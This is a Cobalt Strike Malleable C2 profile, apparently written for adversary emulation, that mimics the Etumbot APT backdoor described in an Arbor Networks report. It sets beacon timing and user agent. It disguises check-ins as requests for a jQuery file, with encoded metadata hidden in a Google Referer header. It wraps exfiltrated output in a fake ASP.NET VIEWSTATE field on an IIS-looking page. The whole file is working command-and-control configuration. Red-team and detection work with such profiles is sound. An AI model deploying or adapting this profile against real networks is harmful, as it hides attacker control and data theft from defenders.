#
# Etumbot Profile
#   http://www.arbornetworks.com/asert/2014/06/illuminating-the-etumbot-apt-backdoor/
#
# Author: @harmj0y
#
set sample_name "Etumbot";

set sleeptime "5000";
set jitter    "0";
#set maxdns "255";

set useragent "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)";

http-get {

    set uri "/js/min.jquery.js";

    client {

        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*l;q=0.8";
        header "Pragma" "no-cache";
        header "Cache-Control" "no-cache";

        metadata {
            base64url;
            prepend "http://www.google.com/?_s=";
            header "Referer";
        }
    }

    server {

        header "Content-Type" "text/javascript";
        header "Server" "Microsoft-IIS/10.0";
        header "X-Powered-By" "ASP.NET";

        output {
            base64;
            print;
        }
    }
}

http-post {
    set uri "/account/index.aspx";

    client {

        header "Content-Type" "application/x-www-form-urlencoded";
        header "Referer" "http://www.google.com";
        header "Pragma" "no-cache";
        header "Cache-Control" "no-cache";

        id {
            base64;
            prepend "__acFlag=";
            header "Cookie: ";
        }

        output {
            append "token=15ce4F1849e906s10";
            base64;
            prepend "__VIEWSTATE=";
            print;
        }
    }

    server {

        header "Content-Type" "text/html; charset=utf-8";
        header "Server" "Microsoft-IIS/10.0";
        header "X-Powered-By" "ASP.NET";

        output {
            append "<!DOCTYPE html>";
            append "<html lang=\"en\">";
            append "<head>";
            append "<meta charset=\"UTF-8\">";
            append "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">";
            append "<title>Manage Account</title>";
            append "</head>";
            append "<body>";
            append "<form method=\"post\" action=\"/account/index.aspx\">";

            append "<!-- VIEWSTATE field -->";
            append "<input type=\"hidden\" name=\"__VIEWSTATE\" id=\"__VIEWSTATE\" value=\"/wEPDwULLTExMjMxMjEOLRyh+WBHHYFAP2nnSVmA==\" />";

            append "<input type=\"submit\" value=\"Submit\">";
            append "</form>";
            append "</body>";
            append "</html>";
            print;
        }
    }
}